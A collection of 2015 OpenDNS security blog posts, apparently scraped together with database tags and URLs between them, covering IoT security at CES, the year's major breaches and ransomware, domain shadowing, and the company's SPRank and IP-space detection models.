At CES — one of the world’s largest and most important showcases for new mass market devices, kicking off this week in Las Vegas — both industry discussions and products on the show floor are beginning gradually beginning to reflect the security research community’s call for better IoT security. From issues with consumer Internet of Things (IoT) infrastructure to hacked self-driving cars, 2015 may end up being remembered as the year that made manufacturers take notice of the security risks that can come from putting consumer devices online.\nOne key indicator comes from how much time CES organizers are devoting this year to educating their members about cybersecurity. USA Today reports that for the first time ever, the show will host several cybersecurity-focused panel discussions. This year’s event will showcase a special cybersecurity forum, featuring more than a half-dozen talks covering everything from how companies can use threat intelligence to discussing the popular TV show “Mr. Robot.” ITbusiness.ca reports that experts such as Director of US-CERT Ann Barron Di Camillo and Brian Krebs, the cybersecurity gumshoe, will speak about topics ranging from improved breach response to mitigating IoT security risks.\nThere are some indications that developers too are becoming more aware of the need to build security into IoT devices. According to ZDNet, IoT technology was at the top of the agenda at the AT&T Developer Summit, a conference and hackathon being held in parallel with CES. Ralph de la Vega, CEO and president for AT&T’s mobile and business units, said the industry should be concerned about protecting the data collected by IoT devices.\nIt appears that consumers are also beginning to pay attention to IoT security. A company called CUJO recently completed a crowdfunding campaign to offer a consumer-grade UTM device to protect connected devices like game consoles and security cameras. The startup exceeded its funding goal by over 700 percent. Last year at CES, the expo included the first-ever “Personal Privacy and Cyber Security Marketplace” — a collection of exhibitors showing off the latest technologies to keep home devices protected and private.\nA positive step for consumer safety, all of the efforts at CES indicate a growing trend toward increased security literacy outside of the infosec community.

The security discussion continued to gain momentum as Net Neutrality came to a decisive vote in February, and again in April when Tesla’s site was hacked. June and July proved that “summer slowdown” doesn’t apply to cybercrime, as both the Office of Personnel Management and the dating site Ashley Madison were popped in quick succession, and researchers revealed just how possible it is to hack vehicles at Blackhat.

Mainly because of the magnitude and wide array of personal information.” – Leon Ravenna, Vice President Security & Compliance, Interactive Intelligence\n“Hearing about the Valve password reset vulnerability was disappointing.” – Vinny Lariza, Security Analyst/Community Moderator, OpenDNS\n“A trend, really. The breach and data theft from multiple healthcare insurers signals that much more than government secrets and financial holdings are considered valuable and targeted. Coupled with the breach of a toy vendor late this year, it appears PII from all commercial verticals is ripe for attack and exploitation.” – Neil Erath, AVP IT Infrastructure Security, Chubb Group of Insurance Companies\n“The Lenovo superfish root certificate fiasco. Lenovo installed certificates on new systems to intercept SSL traffic and inject advertising into users traffic. Additionally, the recent eDellRoot self-signed certificate Dell installed in new systems. It was meant to make it easier for Dell customers to get support, but also made it simple for attackers to cryptographically impersonate HTTPS-protected websites.” – Josh Pyorre, Security Analyst, OpenDNS\n“Although it was very recent, the Juniper backdoor issue was pretty massive.” – Kevin Bottomley, Security Analyst, OpenDNS\n“It wasn’t a single incident that gave me pause in 2015. Every breach that impacted me personally gave me pause, three of which resulted in reissuing a credit card. I have “free” identity protection from 3 different identity protection services now.

The new data, released by the U.K.’s Office for National Statistics (ONS), includes an estimated 5.1 million online fraud incidents and 2.5 million instances that meet the country’s legal definition of computer crime. These new categories dramatically increase the country’s crime rate to over 11.6 million total offenses.\nGiven the media attention devoted to nation state attacks and high-profile data breaches, it’s easy to think that the prevalence of online crime is due to the rise of a new breed of elite hackers. But contrary to common perception in the media, this increase electronic attacks is actually being driven by the commoditization of both the tools and infrastructure used to launch online attacks, according to statements from U.S. officials at both the state and federal level.\nExploit Kits: The New Normal\nAs previously reported on the OpenDNS Security Labs blog, one of the biggest driving forces behind the recent rise in financially-motivated cybercrime has been the increased use of exploit kits. In a statement to CRN last year, FBI Assistant Director George Venizelos said that crimeware kits enable anyone with “$40 and a computer” to potentially become a cybercriminal.\nAvailable for purchase online, these popular crimeware toolkits — also known as exploit kits — work by attacking a known vulnerability in a computer’s software or operating system to deliver an initial, malicious payload. The infected machine can then be added to a botnet, used to steal online banking information or be held hostage by ransomware (like Cryptowall and CryptoLocker). While these exploit kits and malware are available for purchase online, criminals still need a stage from which to launch their attacks.\nSneaky Servers\nHistorically, exploit kits and other malware have either been hosted on hacked websites or on servers run by “bulletproof” hosting providers that cater to shady online activities. Dhia Mahjoub, senior security researcher at OpenDNS, outlined some of the operating processes of these hosting providers during a recent talk at the Hack.lu cybersecurity conference in Luxemborg.\n“One of the biggest advantages that these hosting providers have is they can choose to operate in countries that spend less time and effort on preventing cybercrime,” Mahjoub said. Hosting providers often locate their data centers in countries where there cybercrime laws are lenient or even accepting of activities like distributing malware. Often, the hosting providers’ businesses themselves are also registered in foreign countries, relying on national borders to shield them from law enforcement activity.\nMahjoub said that some providers are bound by law to tell their customers when they receive an abuse report from security researchers or law enforcement. He said that often these reports result in criminals just copying their servers and setting them up in another dark corner of the Internet. In many cases, hosting providers deal with so many customers and servers that malicious behavior simply goes unnoticed.\nHe also noted that detecting and blocking these attacks is no trivial matter, and that attackers have found many ingenious ways of hiding from both law enforcement and security researchers. One technique he uncovered is called “domain shadowing,” or using a compromised subdomain on for a legtimate website (like “malware.opendns.com” instead of “opendns.com”) to launch exploit kit attacks. He also found that attackers could “inject” server addresses into a legitimate hosting provider’s networks by manipulating the routes between networks, further obscuring a server’s true location. In another example, a recent Angler exploit kit group taken down by Cisco’s Talos team used a network of proxy servers to hide an attacker’s infrastructure from the prying eyes of security researchers. This combination of automated attacks and evasion techniques is a hallmark modern exploit kit infrastructure.\nLast month, OpenDNS Security Labs introduced two new security models, SPRank and Predictive IP Space Monitoring, that can automatically detect these kinds of attacks.\n\nUsing Big Data to Avoid Detection\nAggressive activity from security teams can sometimes backfire. Back in 2012, Mahjoub said that it became apparent that traditional, “active” security research methods like actively scanning attacker infrastructure, could alert black hats that security researchers were looking for them. After realizing that they are under scrutiny from the security community, bad guys would then shut down servers and start over in another dark corner of the Internet. He mentions that in one instance, bad actors updated their infrastructure and changed their methods within hours of researchers disclosing information about how they operate.\nThat’s why, he says, the OpenDNS Research Labs team has focused is on studying the aspects of criminal activity that are impossible to hide from outside analysis. He notes that while it’s possible for a criminal to change hosting providers or domain names, there are some things that still need to happen before an infection can occur. For instance, a criminal needs to register a domain before it becomes public and users have to be redirect to a specific website before an exploit kit can infect them.\n“To detect these people, you have to separate their inherent and assigned features,” he said. “Think of it this way: a criminal could have 10 passports that [he uses] to travel all over the world, changing [his] hair color or whatever. That’s analogous to what bad guys do to hide online. They will change the domain names they use, the countries they host their servers in — all to avoid detection.

Back in June, I gave a run down of how to set up and use your own dynamic malware analysis system using an open source project called Cuckoo Sandbox. Out of the box, Cuckoo works great on its own; no complaint here. But, out of the box does not always mean everything is going to work as needed all of the time.\nA couple of months after my last blog post, I was running lots of samples through the Cuckoo API that were automatically downloaded from a repository where I have some Yara rules that look for some type of specific badness or the other. This was working out fine and dandy, until one day I noticed that my system kept core dumping and going into kernel panic mode. I struggled with this problem for several days, doing everything I could to try and fix the problem: updating and upgrading the system, running fewer samples, reinstalling packages, all to no avail.\nAfter some conversation with other researchers in the security industry, it came to my attention that the specific malware I had been hunting had started to employ a defensive tactic by making lots and lots of useless API calls, in the attempt to break the analysis by filling up the database and thus crashing the system.\nThis appeared to be a very effective means of making my day harder — obviously the intended result.\nLuckily, in the same conversation, I was pointed to a fork of Cuckoo with some modifications to deal with this exact problem, as well as a few others.\nPer the README.md, the fixes and additions include:\nFully-normalized file and registry names\n64-bit analysis\nHandling of WoW64 filesystem redirection\nMany additional API hooks\nService monitoring\nCorrelates API calls to malware call chains\nAbility to follow APC injection and stealth explorer injection\nPretty-printed API flags\nPer-analysis Tor support\nOver 130 new signature modules (over 70 developed solely by Optiv)\nAnti-anti-sandbox and anti-anti-VM techniques built-in\nMore stable hooking\nAbility to restore removed hooks\nGreatly improved behavioral analysis and signature module API\nAbility to post comments about analyses\nDeep hooks in IE’s JavaScript and DOM engines usable for Exploit Kit identification\nAutomatic extraction and submission of interesting files from ZIPs, RARs, RFC 2822 emails (.eml), and Outlook .msg files\nDirect submission of AV quarantine files (Forefront, McAfee, TrendMicro, Kaspersky, MalwareBytes, MSE/SCEP, and SEP12 formats currently supported)\nAutomatic malware classification by Malheur\nSignificant contributions from Jeremy Hedges, William Metcalf, and Kevin Ross\nHundreds of other bugfixes\nTo be completely honest I don’t know which one of these “fixes” actually took care of my database problem, but it did indeed work as I was told it would. Soon after re-installing, I was back up and running and all of my core dump problems went away. Once again, I was a happy little analyst.\nOne of the cooler aspects to this update I noticed was the ability to change the database to use Elasticsearch, thus allowing the use of the entire ELK stack as a built-in feature. If you have never used ELK before, I highly recommend checking it out. Its versatility goes far beyond just making pretty graphs for dynamic malware analysis, as can be seen in the following example (which is not relevant to information in this blog):\n(source: http://www.digitalgov.gov/files/2014/05/600-x-333-ELK-dashboard-deck.jpg)\nWith the addition of more than 100 signatures for detection, TOR for obfuscation, ELK for fancy, pretty graphs, anti-anti-virtual machine capabilities, and much more, I would have to recommend, if nothing else, to at least try this modified Cuckoo fork and decided for yourself.\nBut I’m pretty sure you will agree its enhancements are well worth it.', 'Incident Response;Malware;Open Source;Security Community;Security Research;Security Tools;Threat Dis', 'https://umbrella.cisco.com/blog/2015/12/15/new-cuckoo-for-you/');

Some registered users even admitted considering the worst. “I have contemplated suicide daily for the past week,” one person e-mailed to Hunt. “My two beautiful children and my wife are keeping me alive. I am very worried that her family and others will find out, making it extremely difficult for her to stay with me.”\nImage from KrebsOnSecurity.\nThe motivations behind this attack seemed different than just a commonplace data grab. It was more personal, intending at first to do serious damage to Ashley Madison and its reputation. But because of the site’s purpose, the hack had a devastating effect on affected users. Names, e-mail addresses, credit card information, purchase history, search queries, and profile information were all published online for anyone in the world to search. People could easily find friends, colleagues, family members, spouses, or even enemies and conclude they were cheaters, even if that was not the case. Suddenly careers, relationships, and families were jeopardized as a result of trusting a site that promised privacy — something we all do every day.\n2014: The Year of the Breach as Usual\nWhile Target was still going through settlement proceedings in the aftermath of its huge data breach in 2013, hackers hit Sony Pictures, Home Depot, JP Morgan Chase, Spotify, Neiman-Marcus, CHS Community Health Systems, Staples, Michael’s, and eBay (not to mention dozens of others), causing the media and the security community to label 2014 the year of the breach.\nIt was the year every corporation in the world woke up to the dire state of security. But the motive for these attacks — with the exception of Sony — made logical sense, as the economic rewards were direct and immediate. Grab as much data as possible; then sell it to the highest bidder. The hackers involved were mostly out to make a buck, not ruin lives.\nImage from HackerNews\nAnd while individual users, consumers, and shoppers might have gone through the annoyance of needing a new credit card or a password reset, the effects of losing personal data in a massive breach never hurts in the same exigent sense of what happened throughout 2015.\nThe hacks witnessed this year — though the large data grabbing hacks also continued — hit an intimate level.\n2015: The Year of Extortion\nThough Ashley Madison provided a yet unseen case study in what can happen when the incriminating details of millions of individuals’ lives get published online, monetary gains were still very much a motivation for hackers in 2015. Shortly after the attack, extortionists began to send threats of notifying the spouses and friends of individuals found in the leaked database, unless they received a Bitcoin payment.\nRansomware also amplified to an astounding level. McAfee estimated the number of attacks in the third quarter of 2013 at 1.5 million. In the second quarter of 2015, that estimate was 4 million, with 1.2 million of the attacks being totally new. The rapid popularity growth is likely due to the cheap and effective nature of ransomware attacks. Hackers now only need to spend a marginal amount of capital to set up an infrastructure, and the returns can be large.\nRansomware attacks strike fairly indiscriminately, hitting both companies networks and individuals alike. Once in, the exploits are written to deliberately encrypt files that are likely irreplaceable.\nImage from Gizmodo.\nVictims through no fault of their own suddenly risk losing videos and photos of their first born, or the last trip to see Grandma, or the important tax files needed for next year’s return. Some of the latest variants of attack even add insult to injury, mocking victims with a taunting pop-up message once files are encrypted.\nUnfortunately, these attacks work often enough to encourage attackers to persist. Hitting individuals and corporate networks alike, ransomware has become so effective that an FBI agent speaking at a security conference this year admitted to suggesting that victims just pay the ransom to avoid losing access to files forever.\nThere are precautions (like backing up files to the cloud) that can help protect against losing data, and security companies are pitching in to provide tools that can help decrypt locked files. This is great news for infected computers, but security and cryptology experts are already imagining a future in which people are faced with the dilemma of paying a ransom to get your car to start in the morning or watch Netflix on a smart TV.\nThat imagined future might already be on the doorstep.\nIoT: Insecurity at Work, at Home, and on the Road\nIn June researchers OpenDNS Security Labs published a report examining the security of various Internet of Things (IoT) devices, after finding that all of the devices examined had a vulnerability of one kind or another. It’s becoming clear that security is often an afterthought for IoT device manufacturers and software developers.\nAP Photo/Mark Lennihan\nAlso in 2015, researchers Chris Valasek and Charlie Miller demonstrated the very real possibility of disabling a car while its being driven; a Barbie doll showed it could be used to spy on children; vulnerabilities in apps from VTech breached millions of images and voice messages of children (luckily they were not published); researchers at Rapid7 demonstrated that nine publicly available baby monitors were vulnerable to attack; and security expert Billy Rios was hired by the Mayo Clinic to hack medical equipment currently deployed in hospitals to find out which devices vulnerable — all of them were hackable.\nIt seems the forewarnings of the risks embedded devices bring to the workplace, and into our homes and lives, are already too late. IoT is hackable, and they are already present in everyday life.\nHow We Turn the Tide\nIf attacks are getting more personal, we must all start taking security personally. Though it was a challenging year in a lot of ways, 2015 is also seeing a lot of positive progress in security.\nResearchers advanced their detection methods and threat intelligence models. Industry experts are starting to collaborate more, as are government entities from different nations. The US government has decided to start taking security seriously. Encryption now owns a front-and-center role in the dialog about the future of security. Security companies are having success finding and mitigating large scale attacks that affect millions. And two-factor authentication is becoming a standard for vendors.\nCaptured from Pastebin.\nEven a ransomware author has shown a change of heart, posting an apology and decryption details to Pastebin.\nBut there is still much work to do. All the efforts of the smartest security experts in the world, and the billions of dollars invested in safety for online users and their devices cannot save an ignorant Internet populace. We are reaching a critical point for individual Internet users to accept some responsibility for their own security and apply common sense with their decisions about trust, password management, financial transactions, and what to post online.\nThere is no question; the hacks that occurred this year were alarming. But as the Internet will only increase its role in our daily lives, it’s imperative to keep up the fight in 2016 and beyond.', 'Blog;Community;Labs Research;News;People & Culture;Security 101', 'https://umbrella.cisco.com/blog/2015/12/10/2015-the-year-hacking-got-personal/');

Bargain prices on devices might come with a heavy security cost as more mobile apps and devices are going to market preloaded with malware and viruses. This year’s security news has been sprinkled with stories of a seemingly increasing trend of tech vendors embedding security holes in their products.\nIt’s a troubling symptom of the diminishing control users have over their own privacy and security on the devices they own and apps they use. For enterprises, it’s a troubling prospect to open a company’s network to newly issued laptops or tablets or smartphones that contain hard-coded security flaws.\nCompromised by Design\nIn February this year, Lenovo got in a publicity kerfuffle after it was discovered the company had installed self-signed certificates on Lenovo brand laptops. The motivation, Lenovo said in a statement, was to help users find “interesting” sites, even if they were visiting HTTPS encrypted sites. Security analysts and the tech media that covered the news pointed out that the self-signed certs leave those same customers open for Man-in-the-Middle attacks.\nImage from Giphy.\nJust this month, Dell was discovered doing pretty much the same thing, encoding an SSL certificate for “support purposes.” After a hasty outcry from the media, Dell responded in a matter of days, apologizing and stating the company would issue a software update to remove the certificate if it had not already been manually removed.\nGoing Mobile\nIt isn’t new that personal devices contain preinstalled viruses or malware. In 2012, laptops from China were found to be loaded with viruses out of the box. And last year, Lookout discovered Android devices preloaded with a form of malware dubbed DeathRing.\nRecently even trustworthy tech sources have been discovered vending compromised devices, like in the case of the Cloudsota Trojan. It was preinstalled on 17,000 Android tablets and sold through a number of selling platforms including Amazon Marketplace.\nThe issue is spreading beyond physical devices to the apps and software they use, sometimes through the very app stores that are supposed to vend legitimate software. In 2013, the Google Play Store was found hosting apps that leaked personal information about users and prompted Trojan virus installs.\nOnce mostly an Android issue, now even the Apple App Store is not entirely immune. In October, a mobile threat research team discovered a virus in nearly 500 iOS apps that potentially infected two million devices. Granted, XCodeHost — the name of the security flaw — was introduced in part due to developer negligence, and was limited to mostly East Asian countries. But the fact that it could happen on Apple devices is a startling new trend that will likely continue, considering Apple’s rising ownership of the mobile market.\nHow to Protect Yourself\nFor good consumer suggestions on mobile safety against embedded attacks, see Scott Matteson’s article in TechRepublic. For PCs (Macs included), it’s a good idea to set up an OS image to wipe and bootstrap a new laptop before using it. If the laptop has a rootkit, like in the Lenovo and Dell cases, it gets a little harder, but there are remediation options available.\nFor enterprises, the same rules apply, and mobile devices should be protected the same as any laptop. To do so means taking control of the network traffic for PCs and mobile devices, in the office and beyond. Even with a mobile device management (MDM) solution in place, DNS is in a perfect position to apply security on any devices that roam off an enterprise network.\nIt’s going to be a challenge for new app software and device hardware companies to maintain a trustworthy reputation if they purposefully undermine buyer security and privacy. How will consumers and enterprises know which software companies and device vendors to trust? And how should those vendors establish and maintain ongoing trust with their customers?', 'Blog;News;People & Culture;Umbrella', 'https://umbrella.cisco.com/blog/2015/12/03/ghost-in-the-shell-baked-in-security-flaws-are-on-the-rise/');

Domain Shadowing is when an attacker gains admin access to a legitimate domain, and uses that legitimate domain to register a large amount of shady subdomains, usually with an exploit kit. For instance, visapayment.opendns[.]com instead of opendns[.]com. It’s becoming more common because of how easy it is to run a domain shadowing attack, and how hard they are to detect.\nUsing a Stolen Reputation\n“Domain shadowing using compromised registrant credentials is the most effective, difficult to stop, technique that threat actors have used to date. The accounts are largely random so there is no way to track which domains will be used next. Additionally, the subdomains are very high volume, short lived, and random, with no discernible patterns. This makes blocking increasingly difficult,” Cisco threat researcher Nick Biasini explained in his blog post about Domain Shadowing. The worst part is owners of the legitimate domain are often not aware it is being used for Domain Shadowing.\nOpenDNS Security Labs researchers have also been tracking the rising popularity of exploit kits, and responded with a new security models and features to detect them. One feature is an addition to OpenDNS’s threat intelligence search engine, Investigate. Called Pattern Search, the feature essentially adds regular expression and wildcard searching to the search engine, allowing for much more correlative results.\nSPRank and Predictive Discovery\nPattern Search in action looking for DGAs.\nCurrently most blocking and detection mechanisms for Domain Shadowing rely on some sort of domain reputation system that rates good versus bad domains. But reputation scores, according to Technical Leader Dhia Mahjoub, are not enough to catch most Domain Shadowing attacks. Mahjoub along with Security Researcher Thomas Mathew recently announced a new security model get around this issue.\n“Compromised domains that have a great historical reputation will easily fool a reputation system,” Mahjoub wrote in a blog post.  Furthermore, cheap hosting makes it difficult to assign meaningful scores for IP reputation as new ranges appear having no historical context to provide it a score. SPRank avoids these issues by analyzing the DNS request patterns to a domain.” In other words, reputation scores, upon seeing a C Name like Amazon[.]com, will give a compromised subdomain a pass, since Amazon is a well-known and highly reputable site.\nHow to Further Protect Against Domain Shadowing\nAside from advanced security solutions like Investigate, the key to protecting against Domain Shadowing lies in protecting the credentials of your site’s registrant, and monitoring for changes on the domain’s registrant account. “It’s one thing that people just don’t do,” Craig Williams, security outreach manager for Cisco Talos, told ThreatPost in an interview. “No one logs back into their registrant account unless they are going to change something, or renew it.”\nTwo-factor authentication is probably the first, most effective precaution. Most domain registration companies, even the often abused GoDaddy, offer two-factor authentication. Using it will ensure that even if admin credentials are compromised, they can’t be used to register a new malicious domain.\nTo find out more about IP Space Monitoring, read Mahjoub’s blog post (linked above) — also includes an in-depth explanation of SPRank. To see the Pattern Search function in action, read the blog post by Security Researcher Chip McSweeney who used it in an experiment to find DGAs with Python.', 'Blog;Labs Research;News;Security 101', 'https://umbrella.cisco.com/blog/2015/11/24/opendns-provides-sheds-light-on-domain-shadowing/');

First, Security Researcher Thomas Mathew and I (Dhia Mahjoub) presented at BruCON on Oct. 9 about a “Unified DNS View to Track Threats.” Then a couple weeks later I presented on Oct. 22 at Hack.lu about “A Collective View of Current Trends in Criminal Hosting Infrastructures.”\nSPRank at BruCON\nIn the talk “Unified DNS View to Track Threats,” we discussed a new model dubbed Spike Rank or “SPRank” that leverages DNS traffic below recursive resolvers. We call this data “recursive DNS data.” Unlike previous models which primarily placed emphasis on features like ASN, BGP prefixes, and WHOIS information, SPRank analyzes traffic signals as the primary interest. The decision to move away from focusing heavily on ASN, IP, and WHOIS information as identifiers of threats came after a new series of threats began to emerge over the past year. The increase in exploit kit campaigns and “domain-shadowing” usage rendered many of the classical domain reputation or IP reputation methods ineffective. Traditionally, a domain reputation model will assign different scores to a domain based on the reputation of its IP host. These reputation scores are based on the historical “goodness” of an IP range or domain. Exploit kits using compromised domains pose problems to these models. Compromised domains that have a great historical reputation will easily fool a reputation system. Furthermore, cheap hosting makes it difficult to assign meaningful scores for IP reputation as new ranges appear having no historical context to provide it a score. SPRank avoids these issues by analyzing the DNS request patterns to a domain.\nSPRank detects domains showing as a sudden surge — or a spike — in DNS queries issued from our 65 million worldwide clients towards our resolvers. These domains feature what we call the “spike behavior.” This behavior is typical of domains used for malware campaigns such as exploit kits, DGAs, fake software, Browlock, and phishing. But it can also be associated with spam domains, domains victimized for DNS amplification attacks, and a slew of other suspicious and even benign uses.\nA major breakthrough of this model is it separates the detected domains into benign, suspicious, and malicious classes. Within the malicious class, we focus mainly on exploit kit domains. Exploit kits are currently the most efficient and widespread infection delivery method of financially motivated malware.\nThe other main advantage of SPRank is that it pinpoints inherent features of malware domains that criminals cannot easily change. Because of OpenDNS’s unique perspective of the Internet and its domains, we can distinguish between acquired or assigned features and inherent features. The assigned features of a domain include the lexical makeup, DGA setup (seed, algorithm), or the hosting, and registration choices. These features are controlled by adversaries, as they can change or update the features when needed. On the other hand, inherent features are related to traffic patterns that emerge globally from clients querying malware domains and are harder to obfuscate or change by the adversary. We are talking here about features such as the distribution of clients across IP space and geography, the geography of resolvers being used, query types, query volumes, domain traffic patterns, etc.\nThe SPRank system consists of a few main subsystems:\nSpike Detection\nDomain History Filter\nQType Filter\nDomain Records Filter\nExpansion of threat intelligence via IP, prefix, ASN, hoster, fingerprint, and email pivoting\nTo learn more about the motivation behind SPRank, its details, components, and results, we invite you to check out our video of the talk at Burcon. The results of the model are very promising. It detects the most current and virulent malware campaigns such as Angler, RIG, and Nuclear exploit kits, in addition to DGAs, fake software, or phishing. Current exploit kit campaigns drop malware payloads ranging from crypto-ransomware, banking Trojans, and infostealers to bots used for DDoS, spam, or click-fraud, as the diagram below shows.\n\nIP Space Monitoring at Hack.lu\nIn the talk “A Collective View of Current Trends in Criminal Hosting Infrastructures” at Hack.lu, I discussed a two-year long effort of research I’ve been conducting about malware hosting IP infrastructures. In this research, I discuss a selection of hosting patterns identified from analyzing DNS, IP space, BGP prefixes, and ASN peering relationships. These patterns have been adopted by suspicious and bulletproof hosting providers to harbor malicious content and deliver malware campaigns on a large scale. In these patterns, we distinguish between botnet-based hosting infrastructures and dedicated hosting providers. In the first category, I discussed a “hosting as a service” infrastructure used to host fast flux malware CnCs. In the second category, I cover eight different recorded hosting patterns:\nCompromised domains, i.e. “domain shadowing”\nDomain shadowing on multiple hosting IPs\nSibling peripheral ASNs and bulk malware IP setup\nLeaf ASNs\nOffshore registration and diversification of IP space\nRogue ASN and affiliated hosters\nAbuse of large hosting providers\nShady hosts within larger hosting providers\nWe have been tracking “domain shadowing” for a few years now [1][2][3][4][5], and Cisco discussed it this year [6]. Despite being a widely known pattern, it is still being used by adversaries for delivering exploit kits, browlock and other suspicious content. We have also been tracking various variants of rogue and bulletproof hosting providers. A very noticeable pattern here is rogue or bulletproof providers register businesses in offshore jurisdictions in the Caribbean islands, Central America, or the Indian Ocean, and they diversify their IP space in both ARIN (North America) and RIPE (Europe) for resiliency and evasion. Below, we show the example of QHoster, a Bulgarian hoster registered in Belize with IP space in ARIN and RIPE, which has been hosting exploit kits and phishing campaigns for some time.\n\nThe combination of these patterns helps us design a model to monitor IP space usage for malicious purposes, and identify in a predictive fashion IP ranges that will be used for malware campaigns even before any domain is hosted on the IPs. This model has been successful in mitigating exploit kit campaigns such as Angler, RIG, and Nuclear.\nThe major advantage of this model is that it analyzes IP space with a much finer granularity than conventional IP, BGP, ASN reputation scoring methods. We focus on IP ranges that are smaller than the BGP prefix and that are operated by rogue hosts or purchased by criminal customers. We also analyze IP fingerprints to single out servers that share the same configurations and that are purchased in bulk and set up in advance to deliver malware and exploit kit campaigns.\nFurthermore, if we confirm that IP ranges, ASNs, or hosts match several of these patterns at the same time, we can flag them with a high confidence as rogue, bulletproof, or heavily abused. We can then quarantine or block their IP space. Additional validation also comes from monitoring hosted content over time.\nStay tuned for future separate blogs in which we will discuss these hosting patterns in more detail.\nThe final takeway is that “SPRank” and “IP Monitoring” can work separately but they are much more efficient if they operate, in tandem, to provide a higher coverage and accuracy in detecting threats. Since we are faced with a massive amount of DNS and IP space data flowing in real time through our worldwide infrastructure, SPRank becomes crucial at finding entry points or seeds of malware domains for immediate blocking but also for “IP Monitoring” to further drill into associated indicators by pivoting around IPs, fingerprints, prefixes, ASNs, hosters, emails, content, etc to expand the intelligence graph and proactively mitigate attacks before they occur. At the same time, “IP Monitoring” can function in a standalone fashion by sweeping and scrutinizing IP ranges picked up by other models or feeds.', 'Big Data;Malware;Security Research;Security Tools;Threat Discovery', 'https://umbrella.cisco.com/blog/2015/11/19/sprank-and-ip-space-monitoring/');

On the surface, the two companies couldn’t have appeared more different that night — one an Internet security company, the other an early pioneer in Internet radio. But when it comes to data science the companies are similar in that they both rely on having unique sets of data no other company can match.\nDuring this particular meetup, Hubbard outlined a new approach to using data science for network security. He explained the unique view OpenDNS had of the world’s constantly-shifting Internet addresses and how this vantage point resulted in powerful insight into the traffic patterns of millions of daily users. Now, almost three years later under Hubbard’s leadership, OpenDNS is unveiling two new detection models that have been developed by the company’s data science team. The first new model, called Spike Rank (SPRank), is a detection system that uses mathematical concepts more commonly used to analyze sound waves in real time — much like similar techniques used for Pandora’s Music Genome Project. The second model, Predictive IP Space Monitoring, uses the clues uncovered by SPRank to anticipate attacks before they take place. Together the two models expand the company’s applied artificial intelligence system for blocking online attacks.\nTaking a Data Science Approach to Security\nFrom the beginning, Hubbard realized that OpenDNS’s millions of users around the world gave his team a dataset that was unlike any other, even among security companies. The company sees over 80 billion Internet requests daily and has access to years’ worth of network traffic data. Starting in 2012, Hubbard began to build the OpenDNS Security Labs research team, making sure to include a mix of specialized security researchers and hardcore data scientists. He was looking to adopt a hybrid approach that would use data-centric techniques to revolutionize traditional security research. One of the first researchers Hubbard brought on board was Dhia Mahjoub, Ph.D, a data scientist with specific expertise in distributed sensor networks.\nDuring that same data mining meetup in 2012, OpenDNS’s research team outlined a model that already could predict domain names generated by the notorious Cryptolocker ransomware and some botnets. By late 2013, this predictive system could identify and block connections to the domain names used by malware — days or even weeks before attacks were launched.\nAs a next step, Mahjoub shifted focus to study the more complex attacks based on exploit kits, one of the most popular forms of malicious software used to infect computers. Once an unsuspecting user’s machine has been compromised, bad actors can add the infected machine to a botnet, steal online banking information, or install further malware. For example, in one recent case, a campaign taken down by Cisco’s Talos research team was estimated to generate more than $30 million for criminals, annually.\nThrough his work, Mahjoub discovered that the criminals behind the latest wave of attacks were using an entirely different set of approaches to hide the servers they set up to power their campaigns from detection. They would automate the process of using legitimate websites and domains that they had already hacked to make malicious web traffic look legitimate. Other criminals would launch entirely new domains, hosted in the dark corners of the Internet or use a network of proxy servers to hide their online activities. These evasion techniques made it very difficult for an automated system to detect if a new subdomain should be blocked or not, until a significant amount of time (weeks or months) had passed after an attack had already been launched.\nFinding “Ghost Noises”\nTo tackle the problem of identifying criminals online, Mahjoub enlisted the help of fellow OpenDNS data scientist Thomas Mathew. Together, the two began looking for patterns in network requests for compromised websites — trying to find a method that would reliably detect these attacks. “We started asking ourselves questions such as ‘What are a set of features that are hard for criminals to change? What is something that people don’t really think about?’” Mathew said. “Then I realized…if you’re thinking about network traffic, it’s really nothing more than a waveform.”\n\nBy looking at the network traffic in OpenDNS’s dataset as patterns, Mahjoub and Mathew could see that some domains (like gmail.com or amazon.com) have consistent high-volume incoming traffic. Others might have sudden spikes in traffic at regular intervals or follow some other pattern entirely. Mathew began cross-referencing these newly-discovered traffic patterns with the data already in Security Graph, OpenDNS’s database of “good” and “bad” Internet addresses. By examining how traffic patterns changed after they became malicious, Mathew realized that the traffic patterns closely echoed the sound waves that companies like Pandora classify every day.\n“There’s already lots of mathematical theory that exists to describe sounds,” Mathew said. “Domains like Google and Yahoo! will have a similar ‘sound wave,’ because they get lots of regular traffic. The domains used in these attacks are only alive for a certain amount of time, so their patterns are much faster and shorter. To continue the analogy, these attacks sound like ghost noises — short beeps or chirps. Imagine a sound that appears for just a second and then is gone. You need to build a system that can match that pattern and identify those sounds as quickly as possible.”\nQuickly, Mahjoub and Mathew discovered that this new system functioned as a kind of sonar for network security — it was able to quickly locate these transient patterns in the more than half a terabyte of traffic data that OpenDNS processes on an hourly basis. As they cross-referenced the domains tagged by SPRank (this new, patent-pending recognition system) with other systems, they found that it could identify these malware attack patterns with a high degree of accuracy. Now in production, the model identifies hundreds of compromised domains every hour — over a third of which are not detected by any other antivirus or antimalware scanner, according to VirusTotal. But even as they implemented a new system for identifying attacks in progress, the two wondered — how could they zero in on these attacks before they occurred?\n\nAnticipating the Next Attack\nAfter spending nearly two years studying how criminals were hiding “bad” domain names among “good” ones online, Mahjoub concluded that another model would be needed to predict attacks before they occur. Mahjoub used a more granular approach that catalogued the “fingerprints” left by bad actors’ collective infrastructure. He found that this method could identify over 300 new domains every hour that would be used to host malware in the future… allowing him to block these domains before an attack is ever launched.\nCalled Predictive IP Space Monitoring, this new model starts with the initial ‘clues’ found by SPRank. It uses eight major patterns in how servers are hosted to determine which domains will be the source of future malicious activity. For example, Mahjoub uncovered a new technique called domain shadowing, or using a compromised subdomain for a legitimate website (like “bad.opendns.com” instead of “opendns.com”) as the base for launching an attack. He also discovered how attackers could hide server addresses in a legitimate hosting provider’s infrastructure by manipulating the connections between networks. While no one indicator predicts an attack by itself, Mahjoub has been able to train his model over time by cross-referencing the list of predicted malicious servers with those that were actually involved in attacks.\nClick to enlarge\nThis new model essentially scores every step in the process that a criminal goes through to set up their own infrastructure — from choosing a hosting provider to deploying server images — to determine whether an attack is going to take place. By focusing on these unchangeable characteristics, Mahjoub’s model is able to ignore the individual evasion techniques that criminals employ and focus on identifying the overall pattern that precedes malicious activity.\n“With this system, SPRank finds the clues, but analyzing the overall hosting infrastructure with Predictive IP Space Monitoring cracks open the case,” Mahjoub said.\nMahjoub is the first to say that this new artificial intelligence system in use at OpenDNS isn’t static. The point, he says, is that the bad guys are constantly finding new ways to hide online which forces the team’s own models to constantly adapt and learn from new data.\n“When we build a model, it’s not like we can just build it and 